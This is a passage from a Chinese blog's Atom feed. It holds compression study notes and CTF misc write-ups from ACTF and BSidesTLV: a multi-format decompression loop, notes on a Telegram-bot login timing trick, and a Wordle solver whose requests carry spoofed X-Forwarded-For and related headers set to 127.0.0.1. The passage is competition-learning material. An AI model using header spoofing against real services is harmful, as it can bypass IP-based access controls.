alt="image-20220713222653529"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="misc" scheme="https://www.imfengyuan.info/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>MISC- Compression_Series-StudyNotes-1.入门</title>
    <link href="https://www.imfengyuan.info/2022/07/12/ZIP-ORIGIN/"/>
    <id>https://www.imfengyuan.info/2022/07/12/ZIP-ORIGIN/</id>
    <published>2022-07-12T22:23:16.000Z</published>
    <updated>2022-07-12T22:23:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC-Compression-Series-StudyNotes-1-入门"><a href="#MISC-Compression-Series-StudyNotes-1-入门" class="headerlink" title="MISC- Compression_Series-StudyNotes-1.入门"></a>MISC- Compression_Series-StudyNotes-1.入门</h1><h2 id="1-压缩原理"><a href="#1-压缩原理" class="headerlink" title="1.压缩原理"></a>1.压缩原理</h2><p>使用更少的**<u>比特</u>**编码数据</p><h2 id="2-无损压缩"><a href="#2-无损压缩" class="headerlink" title="2.无损压缩"></a>2.无损压缩</h2><p><strong>图片数据（<em>image data</em>）通过一系列的像素值（<em>pixels</em>）进行存储</strong>  [ 图片文件通过元数据（<em>metadta</em>）定义图片的维度、像素值的位置 ] </p><p>每一个像素的颜色，由三原色（<strong>RGB</strong>）混合而成，每一原色使用一个字节（<em>0-255</em>）存储，则每一个像素需要3字节（<em>bytes</em>）</p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%889.22.03.png" alt="截屏2022-07-12 下午9.22.03"></p><blockquote><p>Source:Crash Course Computer Science #21</p></blockquote><p>压缩方式一：<strong>减少重复或多余的信息</strong>，常见直白的方法：<strong>游程编码</strong>（英語：<em>run</em>-<em>length encoding</em>，缩写<em>RLE</em>），利用文件中存在相同的值，例如：上图中存在7个相同颜色的黄色，可以插入一个额外的字节，代表“连续7个黄色像素”</p><p><img src="/../../../../../Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%889.29.03.png" alt="截屏2022-07-12 下午9.28.31"></p><p>但在某些情况下，可能不仅没有压缩反而增加了数据，但是我们没有丢失任何数据，可以轻易的恢复到原来的数据，称之为：无损压缩（<em><strong>lossless compression</strong></em>）</p><p>压缩方式二：更紧凑的方式压缩，以块数据为单位，使用一个<strong>字典</strong>，<strong>存储“代码和数据”之间的对应关系。</strong>（<em><strong>DICTIONARY CODERS</strong></em>）假设将两个像素作为一个块，也就是一个数据块具有6个字节</p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%889.33.35.png" alt="截屏2022-07-12 下午9.33.35"></p><p>根据他们的频率，发现</p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%889.34.20.png" alt="截屏2022-07-12 下午9.34.20"></p><p>接下来引出1950年代大卫·霍夫曼（David.A.Huffman）发明了Huffuman Tree（算法原理：首先，列出所有的块，以及出现的频率，在每一轮，选择两个最低的频率，将它们组合成一棵树，不断循环）</p><p><img src="/../../../../../Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%889.39.32.png" alt="截屏2022-07-12 下午9.38.48"></p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%889.39.44.png" alt="截屏2022-07-12 下午9.39.44"></p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%889.39.56.png" alt="截屏2022-07-12 下午9.39.56"></p><p>下面继续将树的每一个分支利用0和1进行标注，从而生成一个字典，如下图所示<img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%889.41.26.png" alt="截屏2022-07-12 下午9.41.26"></p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%889.43.32.png" alt="截屏2022-07-12 下午9.43.32"></p><p> 编码规则需要和编码数据共同保存，编码后的数据</p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%889.45.42.png" alt="截屏2022-07-12 下午9.45.42"></p><p>上述两周压缩方式“减少重复值”和“使用更紧凑额压缩”通常组合使用了，几乎所有的**<u>无损压缩文件</u>**格式都用到了他们，如GIF、PNG、PDF、ZIP。</p><h2 id="3-有损压缩"><a href="#3-有损压缩" class="headerlink" title="3.有损压缩"></a>3.有损压缩</h2><p>但是也有些数据是可以删去的，<strong>人的眼睛看不出来删不删去有什么区别</strong>，这是有损压缩的核心理念。</p><p>人的耳朵擅长识别某些特定的频率，而有些根本听不见，如超声波，那超声波的频率即可删去，人的耳朵对人的音域敏感，所以应尽可能的保持原样，低音介于两者之间，<strong>有损音频压缩</strong>（<em><strong>Lossy audio compressors</strong></em>）利用不同精度编码不同的频段。</p><p>这也是为什么打电话的声音会和你本人的声音会有所区别，随着信号变差或带宽变小，压缩算法会删更多的数据。而<strong>未压缩的音频格式，如WAV或FLAC</strong>，会比压缩后的音频文件，如MP3，大10倍。</p><p>这样的编码，称为感知编码（<em><strong>PERCEPTUAL CODING</strong></em>），依赖于人的感知模型，这也是“有损压缩图像格式”的基础，如<strong>JPEG</strong>（<em><strong>Joint Photographic Experts Group</strong></em>），人的眼睛善于看到尖锐的对比，比如物体的边缘处，但我们看不出颜色的细微变化，**<u>JPEG将图像分解成8x8的像素块，然后扔掉很多高频率的空间数据。</u>**</p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%8810.01.23.png" alt="截屏2022-07-12 下午10.01.23"></p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%8810.01.59.png" alt="截屏2022-07-12 下午10.01.59"></p><p>几乎每个像素都和相邻像素不同，用无损结束很难压缩，因为太多不同了，有很多的小细节，但是人眼注意不到所有这些细节，因此可以放弃很多块，<strong>用一个简单的块代替</strong></p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%8810.03.53.png" alt="截屏2022-07-12 下午10.03.53"></p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%8810.04.40.png" alt="截屏2022-07-12 下午10.04.40"></p><p>视频本质就是一长串图像，所以图片的很多方面也适用于视频，但是视频可以做一些额外的小技巧，因为帧与帧之间有很多的像素是一样的（<em><strong>TEMPORAL REDUNDANCY</strong></em>），还有更厉害的视频处理。</p><p><strong><u>MPEG-4</u></strong> 视频是一种常见的标准，通常比源文件小20至200倍，将图片变成补丁，然后通过移动和旋转更新画面，但是偶尔也会出现奇怪的画面。</p><p><img src="/../imgs/Untitled/%E6%88%AA%E5%B1%8F2022-07-12%20%E4%B8%8B%E5%8D%8810.09.08.png" alt="截屏2022-07-12 下午10.09.08"></p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><ul><li><p>无损压缩的方式：游程编码和字典编码的组合</p><ul><li>游程编码：增加额外字节，代表长度位</li><li>字典编码：通过块数据出现的频率，形成树结构，分支0和1生成字典，将字典规则和数据存储</li><li>无损压缩的文件类型：ZIP、PNG、PDF、GIF、WAV、FLAC</li></ul></li><li><p>有损压缩的方式：利用人的感知简化细节</p><ul><li>感官编码：利用人的感官区分，简化细节，如声音去掉听不到的频率，图片去掉无法分辨的像素，。</li><li>有损压缩的文件类型：JPEG、MPEG-4</li></ul></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="misc" scheme="https://www.imfengyuan.info/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-ACTF-Misc-部分Wp</title>
    <link href="https://www.imfengyuan.info/2022/06/28/20220628ACTF/"/>
    <id>https://www.imfengyuan.info/2022/06/28/20220628ACTF/</id>
    <published>2022-06-28T22:19:23.000Z</published>
    <updated>2022-06-28T22:20:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h1><p>跟智神内部赛出题思路一样</p><p>几种压缩方式来回压缩，循环解压就行了</p><p>exp</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> zstandard<br><span class="hljs-keyword">import</span> pathlib<br><span class="hljs-keyword">import</span> gzip<br><br>def <span class="hljs-title function_">decompress_lzma_to_folder</span>(input_file):<br>    <span class="hljs-keyword">with</span> <span class="hljs-title function_">open</span>(outputfile,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">f</span>:<br>        <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;lzma:&quot;</span>+outputfile)<br>        f.<span class="hljs-title function_">write</span>(lzma.<span class="hljs-title function_">open</span>(input_file).<span class="hljs-title function_">read</span>())<br><br>def <span class="hljs-title function_">decompress_zstandard_to_folder</span>(input_file):<br>    input_file = pathlib.<span class="hljs-title class_">Path</span>(input_file)<br>    <span class="hljs-keyword">with</span> <span class="hljs-title function_">open</span>(input_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">compressed</span>:<br>        decomp = zstandard.<span class="hljs-title class_">ZstdDecompressor</span>()<br>        <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;zst:&quot;</span>+outputfile)<br>        <span class="hljs-keyword">with</span> <span class="hljs-title function_">open</span>(outputfile, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">destination</span>:<br>            decomp.<span class="hljs-title function_">copy_stream</span>(compressed, destination)<br>            <br>def <span class="hljs-title function_">decompress_gzip_to_folder</span>(input_file):<br>    <span class="hljs-keyword">with</span> gzip.<span class="hljs-title function_">open</span>(input_file,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">f_in</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-title function_">open</span>(outputfile,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">f</span>:<br>            <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;lzma:&quot;</span>+outputfile)<br>            f.<span class="hljs-title function_">write</span>(f_in.<span class="hljs-title function_">read</span>())<br>def <span class="hljs-title function_">decompress_bzip_to_folder</span>(input_file):<br>    <span class="hljs-keyword">with</span> <span class="hljs-title function_">open</span>(input_file,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">f_in</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-title function_">open</span>(outputfile,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">f</span>:<br>            <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;bzip:&quot;</span>+outputfile)<br>            f.<span class="hljs-title function_">write</span>(bz2.<span class="hljs-title function_">decompress</span>(f_in.<span class="hljs-title function_">read</span>()))<br><br>count = <span class="hljs-number">1</span><br>extra_outputfile = <span class="hljs-string">&quot;./flag&quot;</span>  + <span class="hljs-title function_">str</span>(count)<br>outputfile = <span class="hljs-string">&quot;./flag&quot;</span>  + <span class="hljs-title function_">str</span>(count+<span class="hljs-number">1</span>) <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">1000</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-title function_">open</span>(extra_outputfile,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">f</span>:<br>        data = f.<span class="hljs-title function_">read</span>()<br>        <span class="hljs-title function_">print</span>(data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>        <span class="hljs-keyword">if</span> data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == b<span class="hljs-string">&quot;(\xb5/\xfd&quot;</span> :<br>            <span class="hljs-title function_">decompress_zstandard_to_folder</span>(extra_outputfile)<br>        <span class="hljs-keyword">if</span> data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == b<span class="hljs-string">&#x27;\x1f\x8b\x08\x08&#x27;</span>:<br>            <span class="hljs-title function_">decompress_gzip_to_folder</span>(extra_outputfile)<br>        <span class="hljs-keyword">if</span> data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == b<span class="hljs-string">&#x27;\xfd7zX&#x27;</span> or data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == b<span class="hljs-string">&#x27;]\x00\x00\x80&#x27;</span>:<br>            <span class="hljs-title function_">decompress_lzma_to_folder</span>(extra_outputfile)<br>        <span class="hljs-keyword">if</span> data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == b<span class="hljs-string">&#x27;BZh9&#x27;</span>:<br>            <span class="hljs-title function_">decompress_bzip_to_folder</span>(extra_outputfile)<br>        extra_outputfile = outputfile<br>        <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;extra:&quot;</span> + extra_outputfile)<br>        count = count +<span class="hljs-number">1</span><br>        outputfile = <span class="hljs-string">&quot;./flag&quot;</span>  + <span class="hljs-title function_">str</span>(count+<span class="hljs-number">1</span>) <br>        <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;now:&quot;</span>+outputfile)<br></code></pre></td></tr></table></figure><h1 id="safer-telegram-bot-1"><a href="#safer-telegram-bot-1" class="headerlink" title="safer-telegram-bot-1"></a>safer-telegram-bot-1</h1><p>两个login，中间时间掐一下，就可以，这里也涉及js里面的伪随机数，其实就是一个固定序列的数。</p><p><img src="/../imgs/20220628ACTF/Untitled.png" alt="Untitled"></p><p><img src="/../imgs/20220628ACTF/Untitled%201.png" alt="Untitled"></p><h1 id="safer-telegram-bot-2"><a href="#safer-telegram-bot-2" class="headerlink" title="safer-telegram-bot-2"></a>safer-telegram-bot-2</h1><p>让它说不了话….先开个禁言……</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-BsideTLVCTF-Misc-部分Wp</title>
    <link href="https://www.imfengyuan.info/2022/06/27/20220627Bsides/"/>
    <id>https://www.imfengyuan.info/2022/06/27/20220627Bsides/</id>
    <published>2022-06-27T22:19:23.000Z</published>
    <updated>2022-06-27T22:20:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wordle"><a href="#Wordle" class="headerlink" title="Wordle"></a>Wordle</h1><p>出现过好多次的题了，基本上都是写脚本迅速解题，这题也不例外</p><p>先瞟个脚本 → <a href="https://github.com/yotam-gafni/wordle_solver">https://github.com/yotam-gafni/wordle_solver</a></p><p>然后苏神的脚本循环发包</p><p>修改后come.py</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> m<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> lru_cache<br><br>@<span class="hljs-title function_">lru_cache</span>(maxsize=<span class="hljs-title class_">None</span>)<br>def <span class="hljs-title function_">calc_response_vector</span>(w1,w2):<br>tw2 = w2<br>msum = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">5</span>)]<br><span class="hljs-keyword">for</span> c_ind <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> w1[c_ind] == tw2[c_ind]:<br>msum[c_ind] = <span class="hljs-number">2</span><br>tw2 = tw2[:c_ind] + <span class="hljs-string">&quot;*&quot;</span> + tw2[c_ind+<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">for</span> c_ind <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> w1[c_ind] <span class="hljs-keyword">in</span> tw2 and msum[c_ind] == <span class="hljs-number">0</span>:<br>msum[c_ind] = <span class="hljs-number">1</span><br>ind_app = tw2.<span class="hljs-title function_">find</span>(w1[c_ind])<br>tw2 = tw2[:ind_app] + <span class="hljs-string">&quot;*&quot;</span> + tw2[ind_app+<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">return</span> msum<br><br>client = m.<span class="hljs-title function_">M</span>()<br>client.<span class="hljs-title function_">init</span>()<br><span class="hljs-keyword">while</span> <span class="hljs-title class_">True</span>:<br>    f = <span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;words.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>    all_w = <span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;words.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>    lines = f.<span class="hljs-title function_">readlines</span>()<br>    all_lines = all_w.<span class="hljs-title function_">readlines</span>()<br>    count = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> round <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">6</span>):<br>        min_wc = <span class="hljs-number">100000</span><br>        chosen_word = <span class="hljs-string">&quot;&quot;</span><br>        srmat = &#123;&#125;<br>        <span class="hljs-keyword">if</span> round != <span class="hljs-number">0</span>:<br>            all_it = all_lines<br>        <span class="hljs-attr">else</span>:<br>            all_it = [<span class="hljs-string">&quot;crate&quot;</span>]<br>        <span class="hljs-keyword">for</span> w1 <span class="hljs-keyword">in</span> <span class="hljs-attr">all_it</span>:<br>            w1 = w1.<span class="hljs-title function_">strip</span>()<br>            mat = &#123;&#125;<br>            rmat = &#123;&#125;<br>            <span class="hljs-keyword">for</span> w2 <span class="hljs-keyword">in</span> <span class="hljs-attr">lines</span>:<br>                w2 = w2.<span class="hljs-title function_">strip</span>()<br>                msum = <span class="hljs-title function_">calc_response_vector</span>(w1,w2)<br>                <span class="hljs-keyword">if</span> <span class="hljs-title function_">tuple</span>(msum) not <span class="hljs-keyword">in</span> <span class="hljs-attr">rmat</span>:<br>                    rmat[<span class="hljs-title function_">tuple</span>(msum)] = [w2]<br>                <span class="hljs-attr">else</span>:<br>                    rmat[<span class="hljs-title function_">tuple</span>(msum)].<span class="hljs-title function_">append</span>(w2)<br>                mat[<span class="hljs-title function_">tuple</span>([w1,w2])] = msum<br><br>            M = <span class="hljs-title function_">max</span>([<span class="hljs-title function_">len</span>(val) <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> rmat.<span class="hljs-title function_">values</span>()])<br>            <span class="hljs-keyword">if</span> M &lt; <span class="hljs-attr">min_wc</span>:<br>                min_wc = M<br>                chosen_word = w1<br>                srmat = rmat<br><br>        <span class="hljs-title function_">print</span>(chosen_word)<br><br>        <span class="hljs-attr">try</span>:<br>            inp = m.<span class="hljs-title function_">convert</span>(client.<span class="hljs-title function_">send</span>(chosen_word))<br>            <span class="hljs-title function_">print</span>(inp)<br>            feedback = <span class="hljs-title function_">tuple</span>([<span class="hljs-title function_">int</span>(el) <span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> inp.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;,&quot;</span>)])<br>            lines = srmat[feedback]<br>        <span class="hljs-attr">except</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_">len</span>(lines) == <span class="hljs-number">1</span>:<br>            <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Done. Final word is &#123;&#125;&quot;</span>.<span class="hljs-title function_">format</span>(lines[<span class="hljs-number">0</span>]))<br>            client.<span class="hljs-title function_">send</span>(lines[<span class="hljs-number">0</span>])<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Failed. Did not find word after 6 attempts&quot;</span>)<br></code></pre></td></tr></table></figure><p>增加session发包类</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">M</span>:<br>    def <span class="hljs-title function_">__init__</span>(self):<br>        self.<span class="hljs-property">session</span> = requests.<span class="hljs-title function_">session</span>()<br><br>    def <span class="hljs-title function_">init</span>(self):<br>        burp0_url = <span class="hljs-string">&quot;https://wordle.ctf.bsidestlv.com:443/&quot;</span><br>        burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="hljs-string">&quot;document&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="hljs-string">&quot;navigate&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Site&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-User&quot;</span>: <span class="hljs-string">&quot;?1&quot;</span>, <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Originating-Ip&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Remote-Ip&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Remote-Addr&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;Te&quot;</span>: <span class="hljs-string">&quot;trailers&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<br>        self.<span class="hljs-property">session</span>.<span class="hljs-title function_">get</span>(burp0_url, headers=burp0_headers)<br><br>    def <span class="hljs-title function_">send</span>(self,content):<br>        burp0_url = <span class="hljs-string">&quot;https://wordle.ctf.bsidestlv.com:443/step&quot;</span><br>        burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;https://wordle.ctf.bsidestlv.com/&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;https://wordle.ctf.bsidestlv.com&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="hljs-string">&quot;empty&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="hljs-string">&quot;cors&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Site&quot;</span>: <span class="hljs-string">&quot;same-origin&quot;</span>, <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Originating-Ip&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Remote-Ip&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Remote-Addr&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;Te&quot;</span>: <span class="hljs-string">&quot;trailers&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<br>        burp0_json=&#123;<span class="hljs-string">&quot;guess&quot;</span>: content.<span class="hljs-title function_">upper</span>()&#125;<br>        res = self.<span class="hljs-property">session</span>.<span class="hljs-title function_">post</span>(burp0_url, headers=burp0_headers, json=burp0_json)<br>        <span class="hljs-title function_">print</span>(res.<span class="hljs-property">text</span>)<br>        <span class="hljs-keyword">if</span> res.<span class="hljs-title function_">json</span>().<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;status&#x27;</span>) == <span class="hljs-string">&quot;ok&quot;</span>:<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>().<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;result&#x27;</span>)<br>    <br>def <span class="hljs-title function_">convert</span>(content):<br>    s = []<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&quot;</span> == <span class="hljs-attr">content</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-attr">content</span>:<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;g&quot;</span>:<br>            s.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;2&#x27;</span>)<br>        elif i == <span class="hljs-string">&quot;.&quot;</span>:<br>            s.<span class="hljs-title function_">append</span>(<span 